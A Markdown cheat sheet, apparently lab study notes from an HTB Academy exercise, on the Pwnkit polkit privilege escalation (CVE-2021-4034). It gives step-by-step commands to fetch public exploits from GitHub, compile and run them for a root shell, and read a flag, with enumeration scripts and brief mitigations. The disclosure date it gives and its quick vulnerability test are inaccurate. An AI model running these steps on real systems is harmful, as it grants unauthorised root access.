```markdown
# 🔐 Polkit/Pwnkit (CVE-2021-4034)

> [!ABSTRACT] Overview
> 
> **Polkit** authorization service vulnerability CVE-2021-4034 "Pwnkit" allows local privilege escalation through pkexec memory corruption, affecting most Linux distributions.

---

## 🚨 CVE-2021-4034 (Pwnkit)

### Vulnerability Details
> [!INFO] Impact & Affected Systems
>
>- **Impact**: Memory corruption in `pkexec` → immediate root shell
>- **Affected**: Most Linux distributions with polkit
>- **Hidden**: Over 10 years undetected (published Nov 2021)
>- **Requirement**: None - any local user can exploit

### Version Check
> [!EXAMPLE] Command Outputs
>
```bash
# Check pkexec availability
which pkexec
pkexec --version

# Check polkit version
apt list --installed | grep polkit
rpm -qa | grep polkit
```

---

## 🚀 Exploitation

### Download and Compile Pwnkit
> [!EXAMPLE] Steps to Exploit
>
```bash
# Download exploit
git clone https://github.com/arthepsy/CVE-2021-4034.git
cd CVE-2021-4034

# Compile exploit
gcc cve-2021-4034-poc.c -o poc

# Execute for immediate root
./poc
# Result: root shell
```

### Alternative Exploits
> [!NOTE] Other Resources
>
```bash
# Other Pwnkit implementations
git clone https://github.com/berdav/CVE-2021-4034.git
git clone https://github.com/joeammond/CVE-2021-4034-PoC.git
git clone https://github.com/Almorabea/Polkit-exploit.git
```

---

## 🔧 Manual Exploitation

### Understanding the Vulnerability
> [!INFO] Details of the Exploit Mechanism
>
```bash
# Normal pkexec usage
pkexec -u root id
# uid=0(root) gid=0(root) groups=0(root)

# Vulnerability in argument processing
# Memory corruption when `pkexec` processes argv[0]
```

### DIY Exploit (Advanced)
> [!WARNING] Advanced Use Only
>
```bash
# Basic exploitation concept
# 1. Exploit argv[0] handling in pkexec
# 2. Trigger memory corruption
# 3. Control execution flow
# 4. Execute arbitrary code as root
```

---

## 🔍 Detection & Enumeration

### Polkit Vulnerability Check
> [!CHECK] Quick Checks for Vulnerability
>
```bash
#!/bin/bash
echo "=== POLKIT/PWNKIT VULNERABILITY CHECK ==="

echo "[+] pkexec availability:"
which pkexec 2>/dev/null && echo "pkexec found - potential CVE-2021-4034"

echo "[+] Polkit version:"
apt list --installed 2>/dev/null | grep polkit
rpm -qa 2>/dev/null | grep polkit

echo "[+] pkexec version:"
pkexec --version 2>/dev/null

echo "[+] Quick vulnerability test:"
if which pkexec >/dev/null 2>&1; then
    echo "[!] LIKELY VULNERABLE - pkexec present"
    echo "Download: https://github.com/arthepsy/CVE-2021-4034.git"
fi
```

### System Information
> [!INFO] Gather Basic Info
>
```bash
# Check Linux distribution
cat /etc/os-release
cat /etc/lsb-release

# Check polkit service
systemctl status polkit
ps aux | grep polkit
```

---

## 🔑 Quick Reference

### Immediate Checks
> [!CHECK] Initial Verification Steps
>
```bash
# Check for pkexec
which pkexec

# Test basic functionality
pkexec -u root id  # If works, likely vulnerable to CVE-2021-4034
```

### Emergency Exploitation
> [!SUCCESS] Immediate Actions
>
```bash
# Quick Pwnkit exploitation
git clone https://github.com/arthepsy/CVE-2021-4034.git
cd CVE-2021-4034
gcc cve-2021-4034-poc.c -o poc
./poc  # Immediate root shell
```

### HTB Academy Example
> [!EXAMPLE] Detailed Exploitation Steps
>
```bash
# 1. Connect to target
ssh htb-student@target

# 2. Check for pkexec
which pkexec

# 3. Download and compile Pwnkit
git clone https://github.com/arthepsy/CVE-2021-4034.git
cd CVE-2021-4034
gcc cve-2021-4034-poc.c -o poc

# 4. Execute for root
./poc
# Get root shell

# 5. Read flag
cat /root/flag.txt
```

---

## ⚠️ Exploit Characteristics

### Pwnkit Advantages
> [!INFO] Key Benefits of the Exploit
>
>- **Universal impact** - Works on most Linux distributions
>- **No prerequisites** - Any local user can exploit
>- **Reliable exploitation** - High success rate
>- **Silent execution** - Minimal system logs

### Limitations
> [!WARNING] Potential Drawbacks
>
>- **Compilation required** - Need gcc on target or transfer binary
>- **Patched systems** - Fixed in updated polkit versions
>- **Detection possible** - Modern EDR may detect exploitation

---

## 🛡️ Defensive Measures

### Patch Status Check
> [!INFO] Verify System Updates
>
```bash
# Check if polkit is updated
apt list --upgradable | grep polkit
dnf check-update polkit

# Verify patch level
pkexec --version | grep -E "(0\.105|0\.117|0\.118|0\.119|0\.120)"  # Vulnerable
```

### Mitigation Options
> [!INFO] Recommended Actions
>
```bash
# Remove pkexec if not needed
sudo chmod 0755 /usr/bin/pkexec  # Remove SUID

# Monitor pkexec usage
auditctl -w /usr/bin/pkexec -p x -k pwnkit_usage
```

---

*Pwnkit (CVE-2021-4034) represents one of the most significant Linux privilege escalation vulnerabilities - any local user can exploit polkit's `pkexec` for immediate root access on unpatched systems.*
```